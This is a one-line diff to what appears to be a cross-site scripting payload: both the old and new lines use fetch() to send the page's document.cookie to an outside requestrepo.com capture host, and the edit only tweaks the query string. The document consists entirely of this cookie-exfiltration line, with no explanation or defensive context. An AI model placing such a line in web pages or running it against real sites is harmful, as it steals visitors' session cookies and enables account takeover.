@@ -1,1 +1,1 @@
-fetch('http://hjfrlnd6.requestrepo.com/?c' + document.cookie)
+fetch('http://hjfrlnd6.requestrepo.com/?' + document.cookie)
